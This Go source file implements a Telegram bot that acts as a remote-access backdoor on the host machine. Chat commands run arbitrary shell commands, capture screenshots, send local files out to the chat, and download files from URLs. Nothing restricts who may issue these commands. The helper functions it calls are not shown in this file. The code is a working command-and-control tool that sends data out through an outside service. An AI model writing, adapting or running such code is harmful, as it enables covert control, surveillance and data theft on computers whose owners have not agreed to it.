package main

import (
	"log"
	"os"
	"strings"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

// Global VARS

var apiKey = "1234567890:AAAAAAA-AA-AAAAAAAAAAAAAA_AAAAA-AAA"

func main() {

	bot, err := tgbotapi.NewBotAPI(apiKey)
	if err != nil {
		log.Panic(err)
	}

	bot.Debug = true

	log.Printf("Authorized on account %s", bot.Self.UserName)

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates, err := bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil { // ignore any non-Message Updates
			continue
		}

		// Get Message text
		msgText := update.Message.Text

		// Got Message
		msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Unknown Command: "+update.Message.Text)

		// Check Message Type
		if strings.HasPrefix(msgText, "/cmd ") {
			// Get command
			command := strings.TrimPrefix(msgText, "/cmd ")
			// Run command
			output, errOut, err := execute(command)
			// Some Error handling
			if err != nil {
				output = "Error executing commad: " + command + "\nWith error:" + errOut + "\nGoError: " + err.Error()
			}

			msg = tgbotapi.NewMessage(update.Message.Chat.ID, output)

		} else if strings.HasPrefix(msgText, "/screen") {
			// Getting Screenshots
			getscreenshot()
			imgMsg := tgbotapi.NewPhotoUpload(update.Message.Chat.ID, "tmp.png")
			imgMsg.ReplyToMessageID = update.Message.MessageID
			bot.Send(imgMsg)
			os.Remove("tmp.png")
			continue
		} else if strings.HasPrefix(msgText, "/down") {

			filePath := strings.TrimPrefix(msgText, "/down ")
			message, err := checkIfCanDownload(filePath)
			if err == nil {
				docMsg := tgbotapi.NewDocumentUpload(update.Message.Chat.ID, filePath)
				docMsg.ReplyToMessageID = update.Message.MessageID
				bot.Send(docMsg)
				log.Printf("sending file " + filePath)
				continue

			} else {
				msg = tgbotapi.NewMessage(update.Message.Chat.ID, message)
			}

		} else if strings.HasPrefix(msgText, "/wget") {
			url := strings.TrimPrefix(msgText, "/wget ")
			// Check if youtput should be file.
			filePath := "stdout"
			if strings.Contains(msgText, "-o") {
				datArray := strings.Split(url, " -o ")
				url = datArray[0]
				filePath = datArray[1]
			}
			data, err := wget(filePath, url)
			if err == nil {
				dataLength := len(data)
				if dataLength >= 4000 {
					msg = tgbotapi.NewMessage(update.Message.Chat.ID, "Data length is too large, you should dump to file")
				} else {
					msg = tgbotapi.NewMessage(update.Message.Chat.ID, data)
				}
			} else {
				msg = tgbotapi.NewMessage(update.Message.Chat.ID, data+err.Error())
			}

		} else if strings.HasPrefix(msgText, "/help") {
			helpMessage := "/help - Display this message\n/cmd <command> - Run shell command\n/screen - Capture screen\n/down <file path> - Download file\n/wget <URL PATH> -o <File Path> - Run a wget command from a url path, Dont use '-o' flag to show output to stdout"
			msg = tgbotapi.NewMessage(update.Message.Chat.ID, helpMessage)

		} else if strings.HasPrefix(msgText, "/test") {
			msg = tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)
		}

		//msg := tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)
		msg.ReplyToMessageID = update.Message.MessageID

		bot.Send(msg)
	}
}
